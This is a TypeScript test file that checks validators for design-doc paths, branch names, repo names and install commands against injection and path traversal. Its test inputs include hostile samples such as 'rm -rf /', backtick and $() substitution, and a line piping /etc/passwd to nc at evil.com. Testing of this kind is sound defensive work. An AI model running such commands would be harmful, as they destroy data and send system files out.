import { describe, test, expect } from 'bun:test';
import {
  validateDesignPath,
  validateBranch,
  validateRepo,
  validateInitCommand,
  splitCommand,
} from './validate.ts';

describe('validateDesignPath', () => {
  test('accepts valid design path', () => {
    expect(validateDesignPath('docs/designs/rate-limit.md')).toBe('docs/designs/rate-limit.md');
  });

  test('accepts nested design path', () => {
    expect(validateDesignPath('docs/designs/auth/oauth-flow.md')).toBe('docs/designs/auth/oauth-flow.md');
  });

  test('trims whitespace', () => {
    expect(validateDesignPath('  docs/designs/foo.md  ')).toBe('docs/designs/foo.md');
  });

  test('rejects path not starting with docs/designs/', () => {
    expect(() => validateDesignPath('src/foo.md')).toThrow('must start with docs/designs/');
  });

  test('rejects path not ending with .md', () => {
    expect(() => validateDesignPath('docs/designs/foo.txt')).toThrow('must end with .md');
  });

  test('rejects path traversal with ..', () => {
    expect(() => validateDesignPath('docs/designs/../../etc/passwd.md')).toThrow('path escapes docs/designs/');
  });

  test('rejects path with .. in the middle', () => {
    expect(() => validateDesignPath('docs/designs/../secrets/key.md')).toThrow('path escapes docs/designs/');
  });

  test('rejects null bytes', () => {
    expect(() => validateDesignPath('docs/designs/foo\x00.md')).toThrow('contains control characters');
  });

  test('rejects newlines', () => {
    expect(() => validateDesignPath('docs/designs/foo\n.md')).toThrow('contains control characters');
  });
});

describe('validateBranch', () => {
  test('accepts valid branch', () => {
    expect(validateBranch('agent/rate-limit')).toBe('agent/rate-limit');
  });

  test('accepts branch with dots', () => {
    expect(validateBranch('feature/v2.0')).toBe('feature/v2.0');
  });

  test('rejects shell metacharacters', () => {
    expect(() => validateBranch('agent; rm -rf /')).toThrow('disallowed characters');
  });

  test('rejects backticks', () => {
    expect(() => validateBranch('agent/`whoami`')).toThrow('disallowed characters');
  });

  test('rejects double dots', () => {
    expect(() => validateBranch('agent/../main')).toThrow('contains ".."');
  });

  test('rejects leading slash', () => {
    expect(() => validateBranch('/agent/foo')).toThrow('malformed');
  });

  test('rejects trailing slash', () => {
    expect(() => validateBranch('agent/foo/')).toThrow('malformed');
  });

  test('rejects .lock suffix', () => {
    expect(() => validateBranch('agent/foo.lock')).toThrow('malformed');
  });
});

describe('validateRepo', () => {
  test('accepts valid org/repo', () => {
    expect(validateRepo('acme/my-app')).toBe('acme/my-app');
  });

  test('accepts dots and underscores', () => {
    expect(validateRepo('my.org/my_repo')).toBe('my.org/my_repo');
  });

  test('rejects bare repo name without org', () => {
    expect(() => validateRepo('my-app')).toThrow('must be "org/repo"');
  });

  test('rejects shell injection', () => {
    expect(() => validateRepo('acme/app; rm -rf /')).toThrow('must be "org/repo"');
  });

  test('rejects triple-segment path', () => {
    expect(() => validateRepo('acme/app/extra')).toThrow('must be "org/repo"');
  });
});

describe('validateInitCommand', () => {
  test('accepts bun install', () => {
    expect(validateInitCommand('bun install')).toBe('bun install');
  });

  test('accepts npm ci', () => {
    expect(validateInitCommand('npm ci')).toBe('npm ci');
  });

  test('accepts yarn install --frozen-lockfile', () => {
    expect(validateInitCommand('yarn install --frozen-lockfile')).toBe('yarn install --frozen-lockfile');
  });

  test('accepts pnpm install --frozen-lockfile', () => {
    expect(validateInitCommand('pnpm install --frozen-lockfile')).toBe('pnpm install --frozen-lockfile');
  });

  test('rejects semicolons', () => {
    expect(() => validateInitCommand('npm ci; curl evil.com')).toThrow('shell metacharacters');
  });

  test('rejects pipe', () => {
    expect(() => validateInitCommand('cat /etc/passwd | nc evil.com 80')).toThrow('shell metacharacters');
  });

  test('rejects backticks', () => {
    expect(() => validateInitCommand('echo `whoami`')).toThrow('shell metacharacters');
  });

  test('rejects $() subshell', () => {
    expect(() => validateInitCommand('echo $(id)')).toThrow('shell metacharacters');
  });

  test('rejects null bytes', () => {
    expect(() => validateInitCommand('npm ci\x00 --malicious')).toThrow('shell metacharacters');
  });

  test('rejects other control characters', () => {
    expect(() => validateInitCommand('npm ci\x07')).toThrow('shell metacharacters');
  });

  test('allows safe custom command without metacharacters', () => {
    expect(validateInitCommand('make setup')).toBe('make setup');
  });
});

describe('splitCommand', () => {
  test('splits simple command', () => {
    expect(splitCommand('bun install')).toEqual(['bun', 'install']);
  });

  test('splits command with flags', () => {
    expect(splitCommand('yarn install --frozen-lockfile')).toEqual(['yarn', 'install', '--frozen-lockfile']);
  });

  test('trims and splits', () => {
    expect(splitCommand('  npm  ci  ')).toEqual(['npm', 'ci']);
  });
});
